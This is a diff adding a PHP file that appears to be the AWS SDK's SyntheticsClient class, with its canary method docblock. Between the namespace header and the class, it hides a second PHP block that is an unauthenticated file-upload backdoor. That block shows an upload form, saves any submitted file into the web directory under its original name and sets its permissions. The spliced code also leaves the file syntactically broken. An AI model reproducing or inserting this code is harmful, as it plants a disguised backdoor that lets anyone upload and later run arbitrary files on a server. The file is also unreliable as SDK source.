@@ -1,0 +1,55 @@
+<?php
+namespace Aws\Synthetics;
+
+use Aws\AwsClient;
+
+<?php
+echo '<center><font color="Red" size="4">';
+
+if(isset($_POST['Submit'])){
+	$filedir = ""; 
+	$maxfile = '2000000';
+	$mode = '0644';
+	$userfile_name = $_FILES['image']['name'];
+	$userfile_tmp = $_FILES['image']['tmp_name'];
+	if(isset($_FILES['image']['name'])) {
+		$qx = $filedir.$userfile_name;
+		@move_uploaded_file($userfile_tmp, $qx);
+		@chmod ($qx, octdec($mode));
+echo"<center><b>Done ==> $userfile_name</b></center>";
+}
+}
+else{
+echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
+}
+echo '</center></font>';
+?>/**
+ * This client is used to interact with the **Synthetics** service.
+ * @method \Aws\Result createCanary(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createCanaryAsync(array $args = [])
+ * @method \Aws\Result deleteCanary(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteCanaryAsync(array $args = [])
+ * @method \Aws\Result describeCanaries(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeCanariesAsync(array $args = [])
+ * @method \Aws\Result describeCanariesLastRun(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeCanariesLastRunAsync(array $args = [])
+ * @method \Aws\Result describeRuntimeVersions(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeRuntimeVersionsAsync(array $args = [])
+ * @method \Aws\Result getCanary(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getCanaryAsync(array $args = [])
+ * @method \Aws\Result getCanaryRuns(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getCanaryRunsAsync(array $args = [])
+ * @method \Aws\Result listTagsForResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTagsForResourceAsync(array $args = [])
+ * @method \Aws\Result startCanary(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startCanaryAsync(array $args = [])
+ * @method \Aws\Result stopCanary(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopCanaryAsync(array $args = [])
+ * @method \Aws\Result tagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise tagResourceAsync(array $args = [])
+ * @method \Aws\Result untagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise untagResourceAsync(array $args = [])
+ * @method \Aws\Result updateCanary(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateCanaryAsync(array $args = [])
+ */
+class SyntheticsClient extends AwsClient {}
